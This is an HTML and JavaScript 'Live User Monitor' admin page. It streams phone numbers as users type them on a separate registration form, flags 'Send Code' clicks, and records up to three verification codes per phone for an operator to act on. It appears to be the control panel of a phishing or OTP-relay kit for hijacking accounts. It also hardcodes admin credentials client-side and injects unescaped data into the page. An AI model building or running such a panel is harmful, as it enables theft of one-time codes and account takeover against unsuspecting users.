<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b1120;
      color: #f8fafc;
      margin: 0;
      padding: 20px;
    }
    .login-box {
      max-width: 360px;
      margin: 80px auto;
      background: #1e293b;
      padding: 24px;
      border-radius: 12px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border-radius: 8px;
      border: 1px solid #334155;
      background: #0f172a;
      color: #fff;
      box-sizing: border-box;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #2563eb;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
    .hidden { display: none; }
    .instant-alert {
      position: fixed;
      top: 16px;
      right: 16px;
      background: #0284c7;
      color: #fff;
      padding: 12px 16px;
      border-radius: 10px;
      font-weight: bold;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.45);
      z-index: 1000;
      display: none;
    }
    .user-card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 14px;
    }
    .live-phone {
      font-size: 22px;
      font-weight: bold;
      color: #4ade80;
      letter-spacing: 1px;
    }
    .typing-tag {
      display: inline-block;
      background: #38bdf8;
      color: #082f49;
      font-size: 12px;
      font-weight: bold;
      padding: 3px 8px;
      border-radius: 999px;
      margin-left: 8px;
    }
    .alert-badge {
      display: inline-block;
      background: #f59e0b;
      color: #000;
      font-weight: bold;
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 13px;
      margin-top: 8px;
    }
    .thumbs-btn {
      font-size: 22px;
      padding: 6px 14px;
      border-radius: 8px;
      border: none;
      background: #16a34a;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .del-btn {
      padding: 6px 12px;
      border-radius: 8px;
      border: none;
      background: #dc2626;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .code-boxes {
      display: flex;
      gap: 10px;
      margin-top: 12px;
    }
    .code-box {
      background: #0f172a;
      border: 1px solid #475569;
      padding: 10px 14px;
      border-radius: 8px;
      min-width: 72px;
      text-align: center;
      font-size: 16px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="instantAlert" class="instant-alert"></div>

  <div id="loginSection" class="login-box">
    <h2>Admin Login</h2>
    <input type="email" id="emailInput" placeholder="Email" />
    <input type="password" id="passwordInput" placeholder="Password" />
    <button id="loginBtn">Login</button>
    <p id="loginError" style="color:#f87171;"></p>
  </div>

  <div id="dashboardSection" class="hidden">
    <h2>Live User Monitor (Instant Real-Time)</h2>
    <div id="usersContainer"></div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const ADMIN_EMAIL = 'admin@example.com';
    const ADMIN_PASSWORD = 'admin123';

    const socket = io();
    const loginSection = document.getElementById('loginSection');
    const dashboardSection = document.getElementById('dashboardSection');
    const loginBtn = document.getElementById('loginBtn');
    const loginError = document.getElementById('loginError');
    const usersContainer = document.getElementById('usersContainer');
    const instantAlert = document.getElementById('instantAlert');

    let isLoggedIn = false;
    let alertTimeout = null;

    function showInstantNotification(phone) {
      if (!isLoggedIn) return;
      const msg = phone
        ? `⚡ Naya user phone register kar raha hai: ${phone}`
        : `⚡ Naya user registration form par phone type kar raha hai!`;

      instantAlert.textContent = msg;
      instantAlert.style.display = 'block';
      clearTimeout(alertTimeout);
      alertTimeout = setTimeout(() => {
        instantAlert.style.display = 'none';
      }, 4000);

      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('Live Registration Alert', { body: msg });
      }
    }

    loginBtn.addEventListener('click', async () => {
      const email = document.getElementById('emailInput').value.trim();
      const pass = document.getElementById('passwordInput').value;
      if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
        isLoggedIn = true;
        loginSection.classList.add('hidden');
        dashboardSection.classList.remove('hidden');

        if ('Notification' in window && Notification.permission === 'default') {
          try { await Notification.requestPermission(); } catch (e) {}
        }

        fetchLiveData();
      } else {
        loginError.textContent = 'Invalid email or password';
      }
    });

    window.sendThumbsUp = async function(sessionId) {
      await fetch('/api/admin/mark-code-sended', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId })
      });
    };

    window.deleteSession = async function(sessionId) {
      await fetch(`/api/sessions/${encodeURIComponent(sessionId)}`, {
        method: 'DELETE'
      });
    };

    async function fetchLiveData() {
      if (!isLoggedIn) return;
      try {
        const res = await fetch('/api/submissions');
        const data = await res.json();
        renderUsers(data.sessions || [], data.groupedCodes || {});
      } catch (e) {}
    }

    socket.on('user:started-registering', (payload) => {
      showInstantNotification(payload && payload.phone);
    });

    socket.on('submissions:update', (data) => {
      if (!isLoggedIn) return;
      renderUsers((data && data.sessions) || [], (data && data.groupedCodes) || {});
    });

    function renderUsers(sessions, groupedCodes) {
      if (!sessions.length) {
        usersContainer.innerHTML = '<p>Abhi koi live user data nahi hai.</p>';
        return;
      }

      usersContainer.innerHTML = sessions.map(s => {
        const codes = groupedCodes[s.phone] || [null, null, null];
        const boxesHtml = [0, 1, 2].map(idx => {
          const val = codes[idx] || '-';
          return `<div class="code-box" title="Attempt ${idx + 1}">${val}</div>`;
        }).join('');

        return `
          <div class="user-card">
            <div>
              Live Phone: <span class="live-phone">${s.phone || 'Typing...'}</span>
              ${s.typingStarted ? `<span class="typing-tag">Registering</span>` : ''}
            </div>
            <div>Password: <span>${s.password ? '••••••' : '-'}</span></div>
            ${
              s.codeRequested
                ? `<div class="alert-badge">🔔 User ne "Send Code" click kiya hai!</div>
                   <button class="thumbs-btn" title="Mark code sended" onclick="sendThumbsUp('${s.sessionId}')">👍</button>`
                : s.codeSended
                  ? `<div style="color:#38bdf8; margin-top:8px;">✔ "code sended" bhej diya gaya</div>`
                  : ''
            }
            <button class="del-btn" onclick="deleteSession('${s.sessionId}')">Delete</button>
            <div class="code-boxes">${boxesHtml}</div>
          </div>
        `;
      }).join('');
    }
  </script>
</body>
</html>
